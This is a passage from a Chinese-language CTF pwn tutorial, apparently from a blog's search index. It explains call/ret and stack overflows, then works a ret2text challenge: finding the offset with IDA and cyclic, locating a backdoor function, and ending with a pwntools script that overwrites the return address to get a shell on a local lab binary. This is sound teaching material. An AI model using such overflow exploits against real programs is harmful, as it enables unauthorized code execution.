的值，即主调函数帧基指针)</strong></li><li><strong>返回(ret):与ca11指令配合，用于从函数或过程返回。从栈顶弹出返回地址(之前 ca11指令保存的下条指令地址)到eip寄存器中，程序转到该地址处继续执行(此时 esp指向进人函数时的第一个参数)。若带有立即数，esp要加上立即数(丢弃一些在执行ca11指令前入栈的参数)。使用该指令前，应使当前栈顶指针所指向位置的内容正好是先前ca11指令保存的返回地址。</strong></li></ol><h2 id="初识栈溢出"><a href="#初识栈溢出" class="headerlink" title="初识栈溢出"></a>初识栈溢出</h2><p><strong>当我们调用一个函数的时候，在函数内部存在，栈溢出漏洞，get函数或者开辟空间大于变量距离栈底的位置，那么就可能造成栈溢出，溢出后如果溢出值覆盖了main_addr,函数的返回地址就会变化，我们可以根据这个特点，篡改返回地址到我们想返回的。看下图，距离栈底0x80个字节，但是允许读取0x200个字节，就会造成栈溢出,接下来我们来小试牛刀</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342005.png"><br>例题：<a href="https://gitee.com/tky5216/CTF/raw/master/PWN/stack/ret2text">附件下载</a><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182342145.png"><br><strong>查看保护</strong><br><strong>打开IDA反编译看看代码逻辑</strong><br><img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343292.png"><br><strong>这里有两种判断偏移的方式</strong></p><ol><li><p>第一种就是看图片上红框部分，显示s距离ebp为0x108个字节所以需要填充0x108+0x4个字节的数据才能覆盖返回地址</p></li><li><p>使用pwngdb中cyclic判断偏移，在call gets处下断点，用gdb调试<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182346316.png"><br> 用cyclic生成有规律的字符串，输入c把字符串输入运行<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182343102.png"><br> 得到一个异常返回地址，程序停止<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344907.png"><br> 用命令cyclic -l 加返回地址算出偏移<img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344504.png"><br> <strong>这里的到的偏移就不用算edp的大小了，因为已经包括edp了</strong><br> <strong>有了偏移我们找一下后门函数</strong></p></li></ol><p>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182344083.png"><br>  <strong>这题也算很仁慈，直接给出了后门函数，我们随着学习的深入，一般不会直接给出后门函数，需要使用各种技巧来进入shell</strong><br>  <img src="https://cdn.jsdelivr.net/gh/tkymax/Picture/test/202407182345121.png"><br>  <strong>接下来开始编写脚本</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs [python]">from pwn import *<br><br>p = process(&quot;./ret2text&quot;)<br>target = 0x0804850B<br>p.recvuntil(&quot;ret2text\n&quot;)<br>payload = b&quot;a&quot; * 0x108 + p32(1) + p32(target)<br><br>p.sendline(payload)<br>p.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN</category>
      
    </categories>
    
    
    <tags>
      
      <tag>栈</tag>
      
    </tags>
    
  </entry>
  
  
  
  
</search>
